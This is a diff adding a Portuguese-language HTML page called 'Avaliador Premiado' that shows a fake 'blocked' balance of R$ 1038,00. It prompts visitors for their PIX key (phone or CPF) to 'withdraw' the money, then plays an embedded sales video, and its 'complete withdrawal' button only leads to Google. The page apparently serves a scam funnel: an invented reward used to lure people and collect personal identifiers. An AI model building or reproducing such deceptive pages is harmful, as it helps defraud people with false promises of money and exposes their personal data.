@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    
+    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <title>Avaliador Premiado</title>
+    <link rel="icon" type="image/x-icon" href="https://i.imgur.com/LBRegsc.png"/>
+    
+
+    <style>
+      .welcome-bar {
+          background-color: #232423; 
+          color: white; 
+          padding: 10px 0; 
+          text-align: center; 
+          position: fixed; 
+          top: 50px;
+          left: 50%; 
+          transform: translateX(-50%);
+          width: 90%; 
+          border-radius: 8px;
+          font-size: 13px;
+          z-index: 9999;
+          transition: opacity 1s; 
+      }
+      /* Classe para ocultar a barra */
+      .welcome-bar.hidden {
+          opacity: 0; /* Torna a barra transparente */
+          pointer-events: none; /* Impede interações com a barra */
+      }
+    </style>
+
+  <script>
+        var option = 'phone';
+
+        function getUrlParams() {
+          var params = {};
+          var query = window.location.search.substring(1);
+          var vars = query.split('&');
+          for (var i = 0; i < vars.length; i++) {
+              var pair = vars[i].split('=');
+              if (pair.length === 2) {
+                  params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]);
+              }
+          }
+          return params;
+        }
+
+        function updateLinks() {
+          var params = getUrlParams();
+          var utmParams = Object.keys(params).filter(function(key) {
+              return key.startsWith('utm_');
+          }).map(function(key) {
+              return key + '=' + params[key];
+          }).join('&');
+
+          if (utmParams) {
+              $('a').each(function() {
+                  var href = $(this).attr('href');
+                  if (href) {
+                      if (href.indexOf('?') > -1) {
+                          $(this).attr('href', href + '&' + utmParams);
+                      } else {
+                          $(this).attr('href', href + '?' + utmParams);
+                      }
+                  }
+              });
+          }
+        }
+
+        function formatar(mascara, documento) {
+            let i = documento.value.length;
+            let saida = '#';
+            let texto = mascara.substring(i);
+            while (texto.substring(0, 1) != saida && texto.length ) {
+            documento.value += texto.substring(0, 1);
+            i++;
+            texto = mascara.substring(i);
+            }
+        }
+
+        function gerarPix() {
+            if ($(".cpf").val().length > 3 || $(".phone").val().length > 3) {
+                $('.pop').removeClass("d-none");
+                $('.pop').removeClass('d-none')
+          var playerDiv = '<div id="vid_663015f6ef68be000c95679b" style="position:relative;width:100%;padding:56.25% 0 0;">' +
+    '<img id="thumb_663015f6ef68be000c95679b" src="https://images.converteai.net/e41c52c0-1591-4eaf-8d8f-6bb645a4e0b7/players/663015f6ef68be000c95679b/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;">' +
+    '<div id="backdrop_663015f6ef68be000c95679b" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div>' +
+    '</div>';
+
+var script = '<script type="text/javascript" id="scr_663015f6ef68be000c95679b">' +
+    'var s=document.createElement("script");' +
+    's.src="https://scripts.converteai.net/e41c52c0-1591-4eaf-8d8f-6bb645a4e0b7/players/663015f6ef68be000c95679b/player.js";' +
+    's.async=true;' +
+    'document.head.appendChild(s);';
+    $('.vtub').html(playerDiv + script);
+
+            } else {
+                alert('Preencha o pix!')
+            }
+        };
+        
+       
+
+        $(document).ready(function() {
+            updateLinks();
+            
+            $('.option').click(function() {
+                $('.option').removeClass('selected');
+                $(this).addClass("selected");
+                option = $(this).attr('id');
+                console.log(option);
+
+                if (option == 'phone') {
+                    $('.phone').removeClass('d-none');
+                    $('.cpf').addClass('d-none');
+                } else {
+                    $('.cpf').removeClass('d-none');
+                    $('.phone').addClass('d-none');
+                }
+            });
+        });
+  </script>
+  </head>
+  <body style="background-color: white;">
+    <nav class="nav">
+        <img src="./LDM-WHITE.png">
+        <div class="saldo">
+          <span id="saldo-txt">R$ 1038,00</span>
+        </div>
+      </nav>
+
+      <div class="pop d-none">
+        <div class="pop-out-foto" style="border: 1px solid grey; padding: 10px 5px;">
+          <div class="bloqueado">
+            <h4>SALDO BLOQUEADO</h4>
+            <h1>R$ 1038,00</h1>
+          </div>
+          <p>Assista o vídeo abaixo para aprender a sacar.</p>
+          <div class="vtub">
+  
+          </div>
+          <button class="btn-pop-out-foto" style="border: 0px;" onclick="window.location.href = 'https://google.com.br'">CONCLUIR SAQUE</button>
+        </div>
+      </div>
+      
+    <div class="post">
+        <div class="container saque" style="flex-direction: column;">
+            <div class="card">
+                <p>Antes de realizar seu 1º saque <b>CADASTRE SUA CHAVE PIX.</b></p>
+            </div>
+            <p style="font-size: 13px; text-align: center; margin: 35px 0px 10px 0px;">
+                <i class="fa-brands fa-pix" style="color: rgb(71, 185, 128);"></i>
+                Selecione sua chave PIX
+            </p>
+            <div class="wrapperOption">
+                <div class="option selected" id="phone">
+                    <i class="fa-solid fa-mobile-screen-button"></i>
+                    Celular
+                </div>
+
+                <div class="option" id="cpf">
+                    <i class="fa-solid fa-address-card"></i>
+                    CPF
+                </div>
+            </div>
+            <input class="phone " type="tel" placeholder="Digite seu número aqui (55 999999999)" OnKeyPress="formatar('(##) #####-####',this)" maxlength="15" />
+            <input class="cpf d-none" placeholder="Digite seu CPF aqui..." OnKeyPress="formatar('###.###.###-##',this)" maxlength="14"/>
+            <button class="btn" onclick="gerarPix();">REALIZAR SAQUE</button>
+        </div>
+    </div>  
+    
+  </body>
+  
+  <script src="./script.js"></script>
+</html>
